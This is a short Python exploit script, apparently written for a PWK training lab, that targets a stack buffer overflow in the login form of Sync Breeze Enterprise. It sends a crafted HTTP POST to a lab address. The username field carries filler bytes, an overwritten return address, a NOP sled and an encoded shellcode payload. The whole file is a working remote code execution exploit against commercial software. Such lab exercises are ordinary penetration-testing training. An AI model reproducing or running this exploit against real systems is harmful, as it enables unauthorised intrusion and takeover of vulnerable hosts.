#!/usr/bin/python
#PWK lab windows buffer overflow- Sync Breeze Enterprise
import socket
import sys

filler = "A" * 780
eip = "\x83\x0c\x09\x10"
offset = "C" * 4
nops="\x90"*8

payload=("\xbf\xec\xe2\x12\xbb\xdb\xc3\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x78\x12\x03\x78\x12\x83\x2c\xe6\xf0\x4e\x50\x0f\x76"
"\xb0\xa8\xd0\x17\x38\x4d\xe1\x17\x5e\x06\x52\xa8\x14\x4a\x5f"
"\x43\x78\x7e\xd4\x21\x55\x71\x5d\x8f\x83\xbc\x5e\xbc\xf0\xdf"
"\xdc\xbf\x24\x3f\xdc\x0f\x39\x3e\x19\x6d\xb0\x12\xf2\xf9\x67"
"\x82\x77\xb7\xbb\x29\xcb\x59\xbc\xce\x9c\x58\xed\x41\x96\x02"
"\x2d\x60\x7b\x3f\x64\x7a\x98\x7a\x3e\xf1\x6a\xf0\xc1\xd3\xa2"
"\xf9\x6e\x1a\x0b\x08\x6e\x5b\xac\xf3\x05\x95\xce\x8e\x1d\x62"
"\xac\x54\xab\x70\x16\x1e\x0b\x5c\xa6\xf3\xca\x17\xa4\xb8\x99"
"\x7f\xa9\x3f\x4d\xf4\xd5\xb4\x70\xda\x5f\x8e\x56\xfe\x04\x54"
"\xf6\xa7\xe0\x3b\x07\xb7\x4a\xe3\xad\xbc\x67\xf0\xdf\x9f\xef"
"\x35\xd2\x1f\xf0\x51\x65\x6c\xc2\xfe\xdd\xfa\x6e\x76\xf8\xfd"
"\x91\xad\xbc\x91\x6f\x4e\xbd\xb8\xab\x1a\xed\xd2\x1a\x23\x66"
"\x22\xa2\xf6\x29\x72\x0c\xa9\x89\x22\xec\x19\x62\x28\xe3\x46"
"\x92\x53\x29\xef\x39\xae\xba\xd0\x16\xc7\xdd\xb9\x64\x27\x23"
"\x81\xe0\xc1\x49\xe5\xa4\x5a\xe6\x9c\xec\x10\x97\x61\x3b\x5d"
"\x97\xea\xc8\xa2\x56\x1b\xa4\xb0\x0f\xeb\xf3\xea\x86\xf4\x29"
"\x82\x45\x66\xb6\x52\x03\x9b\x61\x05\x44\x6d\x78\xc3\x78\xd4"
"\xd2\xf1\x80\x80\x1d\xb1\x5e\x71\xa3\x38\x12\xcd\x87\x2a\xea"
"\xce\x83\x1e\xa2\x98\x5d\xc8\x04\x73\x2c\xa2\xde\x28\xe6\x22"
"\xa6\x02\x39\x34\xa7\x4e\xcf\xd8\x16\x27\x96\xe7\x97\xaf\x1e"
"\x90\xc5\x4f\xe0\x4b\x4e\x7f\xab\xd1\xe7\xe8\x72\x80\xb5\x74"
"\x85\x7f\xf9\x80\x06\x75\x82\x76\x16\xfc\x87\x33\x90\xed\xf5"
"\x2c\x75\x11\xa9\x4d\x5c")

inputBuffer = filler + eip + offset +nops+payload

try:
        print ("Sending evil buffer with %s bytes" %len(inputBuffer))
        
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.231.10\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.231.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.231.10", 80))
        s.send(buffer)
        s.close()   
except:
        print ("Could not connect!")
        sys.exit()

